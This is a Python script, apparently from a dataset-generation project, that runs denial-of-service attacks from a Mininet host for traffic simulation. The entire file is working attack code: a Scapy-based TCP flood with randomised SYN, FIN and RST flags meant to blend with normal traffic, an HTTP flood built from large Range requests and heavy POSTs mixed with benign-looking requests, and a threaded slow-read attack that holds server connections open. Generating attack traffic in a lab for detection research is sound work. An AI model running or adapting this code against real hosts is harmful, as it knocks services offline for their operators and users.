#!/usr/bin/env python3
"""
Adversarial attack runner to execute inside a Mininet host namespace.
Variants:
- ad_syn: TCP state exhaustion-like traffic with mixed flags (Scapy sendp)
- ad_udp: Application layer HTTP requests (requests)
- slow_read: Slow HTTP client behavior (sockets)

Usage:
  python3 -m dataset_generation.src.attacks.adversarial_in_host \
    --variant ad_udp --target 10.0.0.6 --duration 10 --iface h2-eth0
"""
import argparse
import random
import time
import threading
import socket

try:
    import requests
except Exception:
    requests = None

try:
    from scapy.all import IP, TCP, Raw, sendp, Ether
except Exception:
    IP = TCP = Raw = sendp = Ether = None


def run_ad_syn(target: str, duration: int, iface: str):
    # Preferred: raw crafted packets with Scapy
    if IP is None or sendp is None:
        # Fallback: rapid TCP connect attempts to generate SYNs via kernel
        start = time.time()
        attempts = 0
        while time.time() - start < duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect_ex((target, 80))
            except Exception:
                pass
            finally:
                try:
                    s.close()
                except Exception:
                    pass
            attempts += 1
            time.sleep(0.002)
        return attempts
    start = time.time()
    sent = 0
    normal_ports = [80, 443, 22, 53, 8080, 8443]
    while time.time() - start < duration:
        try:
            dst_port = random.choice(normal_ports)
            src_port = random.randint(32768, 65535)
            # 60% SYN, 30% FIN, 10% RST to blend
            r = random.random()
            if r < 0.6:
                flags = "S"
            elif r < 0.9:
                flags = "F"
            else:
                flags = "R"
            pkt = Ether()/IP(dst=target)/TCP(sport=src_port, dport=dst_port, flags=flags,
                                             seq=random.randint(1000000, 4000000),
                                             window=random.choice([8192, 16384, 32768]))
            # 5% tiny payload
            if random.random() < 0.05:
                pkt = pkt/Raw(load=b'A' * random.randint(1, 16))
            sendp(pkt, iface=iface, verbose=0)
            sent += 1
        except Exception:
            pass
        time.sleep(random.uniform(0.002, 0.02))
    return sent


def run_ad_udp_http(target: str, duration: int):
    # Preferred: requests-based HTTP traffic
    if requests is None:
        # Fallback: raw sockets for simple HTTP GET/POST
        start = time.time()
        total = 0
        normal_paths = ['/', '/favicon.ico', '/css/style.css', '/js/app.js', '/about', '/contact']
        while time.time() - start < duration:
            try:
                is_attack = random.random() < 0.6
                if is_attack:
                    # Large header request
                    req = (f"GET /download HTTP/1.1\r\nHost: {target}\r\n" +
                           f"Range: bytes=0-{random.randint(500000, 2000000)}\r\n\r\n")
                else:
                    path = random.choice(normal_paths)
                    req = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nConnection: keep-alive\r\n\r\n"
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                if s.connect_ex((target, 80)) == 0:
                    s.send(req.encode())
                    try:
                        _ = s.recv(64)
                    except Exception:
                        pass
                s.close()
                total += 1
            except Exception:
                total += 1
            time.sleep(random.uniform(0.02, 0.2))
        return total
    start = time.time()
    total = 0
    sess = requests.Session()
    normal_paths = ['/', '/favicon.ico', '/css/style.css', '/js/app.js', '/about', '/contact']
    while time.time() - start < duration:
        try:
            is_attack = random.random() < 0.6
            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/89.0',
                ]),
                'Connection': 'keep-alive'
            }
            if is_attack:
                # Large range GET or heavy POST
                if random.random() < 0.5:
                    headers['Range'] = f"bytes=0-{random.randint(500000, 2000000)}"
                    sess.get(f"http://{target}:80/download", headers=headers, timeout=2)
                else:
                    data = {'data': 'x' * random.randint(1000, 5000)}
                    sess.post(f"http://{target}:80/upload", data=data, headers=headers, timeout=2)
            else:
                path = random.choice(normal_paths)
                sess.get(f"http://{target}:80{path}", headers=headers, timeout=2)
            total += 1
        except Exception:
            total += 1  # count attempt
        time.sleep(random.uniform(0.02, 0.2))
    return total


def _slow_read_worker(target: str, stop_ts: float, connect_timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(connect_timeout)
        s.connect((target, 80))
        req = f"GET /large HTTP/1.1\r\nHost: {target}\r\nAccept: */*\r\n\r\n"
        s.send(req.encode())
        s.settimeout(1)
        while time.time() < stop_ts:
            try:
                _ = s.recv(1)
            except socket.timeout:
                pass
            time.sleep(0.1)
    except Exception:
        pass
    finally:
        try:
            s.close()
        except Exception:
            pass


def run_slow_read(target: str, duration: int, connections: int = 20):
    stop_ts = time.time() + duration
    threads = []
    for _ in range(connections):
        t = threading.Thread(target=_slow_read_worker, args=(target, stop_ts))
        t.daemon = True
        t.start()
        threads.append(t)
        time.sleep(random.uniform(0.01, 0.1))
    for t in threads:
        t.join(timeout=duration + 2)
    return connections


def main():
    p = argparse.ArgumentParser()
    p.add_argument('--variant', required=True, choices=['ad_syn', 'ad_udp', 'slow_read'])
    p.add_argument('--target', required=True)
    p.add_argument('--duration', type=int, default=10)
    p.add_argument('--iface', default='eth0')
    args = p.parse_args()

    if args.variant == 'ad_syn':
        run_ad_syn(args.target, args.duration, args.iface)
    elif args.variant == 'ad_udp':
        run_ad_udp_http(args.target, args.duration)
    else:
        run_slow_read(args.target, args.duration)


if __name__ == '__main__':
    main()
